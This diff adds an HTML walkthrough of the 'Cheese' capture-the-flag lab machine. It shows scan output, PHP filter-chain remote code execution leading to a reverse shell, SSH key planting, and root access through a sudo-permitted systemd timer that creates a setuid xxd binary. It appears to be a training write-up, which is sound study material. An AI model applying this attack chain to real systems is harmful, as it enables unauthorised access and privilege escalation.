@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cheese CTF Walkthrough</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <div class="container">
+        <h1>Cheese CTF Walkthrough (Try Hack Me)</h1>
+        <p>This is one of the easy yet tricky machines to solve.</p>
+        <img src="img/1.png" alt="">        
+        <section>
+            <h2>Nmap Scan</h2>
+            <pre class="code-block">
+PORT      STATE SERVICE
+7/tcp     open  echo
+9/tcp     open  discard
+13/tcp    open  daytime
+21/tcp    open  ftp
+22/tcp    open  ssh
+23/tcp    open  telnet
+25/tcp    open  smtp
+26/tcp    open  rsftp
+37/tcp    open  time
+53/tcp    open  domain
+79/tcp    open  finger
+80/tcp    open  http
+81/tcp    open  hosts2-ns
+88/tcp    open  kerberos-sec
+106/tcp   open  pop3pw
+110/tcp   open  pop3
+111/tcp   open  rpcbind
+113/tcp   open  ident
+119/tcp   open  nntp
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+143/tcp   open  imap
+144/tcp   open  news
+179/tcp   open  bgp
+199/tcp   open  smux
+389/tcp   open  ldap
+427/tcp   open  svrloc
+443/tcp   open  https
+444/tcp   open  snpp
+445/tcp   open  microsoft-ds
+465/tcp   open  smtps
+513/tcp   open  login
+514/tcp   open  shell
+515/tcp   open  printer
+543/tcp   open  klogin
+544/tcp   open  kshell
+548/tcp   open  afp
+554/tcp   open  rtsp
+587/tcp   open  submission
+631/tcp   open  ipp
+646/tcp   open  ldp
+873/tcp   open  rsync
+990/tcp   open  ftps
+993/tcp   open  imaps
+995/tcp   open  pop3s
+1025/tcp  open  NFS-or-IIS
+1026/tcp  open  LSA-or-nterm
+1027/tcp  open  IIS
+1028/tcp  open  unknown
+1029/tcp  open  ms-lsa
+1110/tcp  open  nfsd-status
+1433/tcp  open  ms-sql-s
+1720/tcp  open  h323q931
+1723/tcp  open  pptp
+1755/tcp  open  wms
+1900/tcp  open  upnp
+2000/tcp  open  cisco-sccp
+2001/tcp  open  dc
+2049/tcp  open  nfs
+2121/tcp  open  ccproxy-ftp
+2717/tcp  open  pn-requester
+3000/tcp  open  ppp
+3128/tcp  open  squid-http
+3306/tcp  open  mysql
+3389/tcp  open  ms-wbt-server
+3986/tcp  open  mapper-ws_ethd
+4899/tcp  open  radmin
+5000/tcp  open  upnp
+5009/tcp  open  airport-admin
+5051/tcp  open  ida-agent
+5060/tcp  open  sip
+5101/tcp  open  admdog
+5190/tcp  open  aol
+5357/tcp  open  wsdapi
+5432/tcp  open  postgresql
+5631/tcp  open  pcanywheredata
+5666/tcp  open  nrpe
+5800/tcp  open  vnc-http
+5900/tcp  open  vnc
+6000/tcp  open  X11
+6001/tcp  open  X11:1
+6646/tcp  open  unknown
+7070/tcp  open  realserver
+8000/tcp  open  http-alt
+8008/tcp  open  http
+8009/tcp  open  ajp13
+8080/tcp  open  http-proxy
+8081/tcp  open  blackice-icecap
+8443/tcp  open  https-alt
+8888/tcp  open  sun-answerbook
+9100/tcp  open  jetdirect
+9999/tcp  open  abyss
+10000/tcp open  snet-sensor-mgmt
+32768/tcp open  filenet-tms
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+
+            </pre>
+        </section>
+
+        <section>
+            <h2>Steps</h2>
+            <pre> * The first rabbit hole was the <strong>Nmap</strong> scan.</pre>
+            <pre> * The second rabbit hole is the login page.</pre>
+            <h3>Feroxbuster Scan</h3>
+            <img src="img/2.png" alt="Feroxbuster-Scans">
+            <pre class="code-block">
+301      GET        9l       28w      315c http://10.10.248.117/images => http://10.10.248.117/images/
+200      GET       22l      152w    11038c http://10.10.248.117/images/cheese3.jpg
+200      GET       57l       97w      705c http://10.10.248.117/style.css
+200      GET       28l       53w      834c http://10.10.248.117/login.php
+200      GET      101l      602w    47221c http://10.10.248.117/images/cheese1.jpg
+200      GET       83l      491w    40571c http://10.10.248.117/images/cheese2.jpg
+200      GET       59l      121w     1759c http://10.10.248.117/
+200      GET       59l      121w     1759c http://10.10.248.117/index.html
+200      GET       60l      106w      966c http://10.10.248.117/login.css
+200      GET       18l       35w      377c http://10.10.248.117/users.html
+200      GET        0l        0w        0c http://10.10.248.117/secret-script.php
+200      GET       18l       33w      448c http://10.10.248.117/messages.html
+200      GET       18l       35w      380c http://10.10.248.117/orders.html
+            </pre>
+        </section>
+        <h3>Output of secret-script.php</h3>
+        <img src="img/3.png" alt="">
+        <h3>Output of messages.html</h3>
+        <img src="img/4.png" alt="">
+        <p>After following the link we will redireccted to another page</p>
+        <img src="img/5.png" alt="">
+        <p>php filter bypass</p>
+        <section>
+            <h2>Remote Code Execution and Reverse Shell</h2>
+            <p>After finding a PHP filter bypass, we can achieve remote code execution (RCE) and convert it to a reverse shell.</p>
+            <ol>
+                <li>Capture the request in Burpsuite.</li>
+                <img src="img/6.png" alt="">
+                <li>Send request to the repeater.</li>
+                <li>Download this <a href="https://github.com/synacktiv/php_filter_chain_generator">GitHub repo</a> for generating PHP filter chains.</li>
+            </ol>
+            <li>Then after that run this command</li>
+            <li>python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '</li>
+            <li>Then you will get the output like this</li>
+            <img src="img/7.png" alt="">
+            <li>Copy all the the code untill php://filter then after that replace in the burpsuite request</li>
+            <img src="img/8.png" alt="">
+            <li>To convert that into a rev shell use the below link and follow</li>
+            <li>Go to this website  <a href="https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/?source=post_page-----4dd17ac2c1af--------------------------------"> website link</a> for generating remote code execution.</li>
+            <li>Then you will get a reverse shell</li>
+            <img src="img/9.png" alt="">
+            <li> Initial access</li>
+            <li>After getting the rev shell u can’t read the user.txt file</li>
+            <li>Then generate a ssh key file and replae it with your ssh public key</li>
+            <img src="img/10.png" alt="">
+            <li>Then ssh into that machine using the below command</li>
+            <li> ssh comte@<machine_ip> </li>
+            <img src="img/11.png" alt="">
+        </section>
+
+
+        <section>
+            <h2>Privilege Escalation</h2>
+            <p>Use <code>sudo -l</code> to list available commands:</p>
+            <pre class="code-block">
+                comte@cheesectf:~$ sudo -l
+User comte may run the following commands on cheesectf:
+    (ALL) NOPASSWD: /bin/systemctl daemon-reload
+    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
+    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
+    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
+comte@cheesectf:~$
+        <p>Now change the directory to /etc/systemd/system</p>
+        <p>Then cat the exploit.service</p>
+        <p>Observe this very carefully we have clue for xxd</p>
+        <code>
+comte@cheesectf:/etc/systemd/system$ cat exploit.service
+[Unit]
+Description=Exploit Service
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
+        </code>
+        <p>Make changes in the exploit.timer file, it should look like this</p>
+        <code>
+comte@cheesectf:/etc/systemd/system$ cat exploit.timer
+[Unit]
+Description=Exploit Timer
+
+[Timer]
+OnBootSec=5s
+
+[Install]
+WantedBy=timers.target
+        </code>
+        <p>Then restart the demon service by following the below command</p>
+        <code>
+1 sudo /bin/systemctl daemon-reload
+2 sudo /bin/systemctl restart exploit.timer
+        </code>
+        <p>Then after that go to gtfobins and search for “xxd”</p>
+        <a href="https://gtfobins.github.io/gtfobins/xxd/?source=post_page-----4dd17ac2c1af--------------------------------">GTFO BINS LINK</a>
+            </pre>
+<h1>Now you have got the root permission</h1>
+        </section>
+    </div>
+
+</body>
+</html>
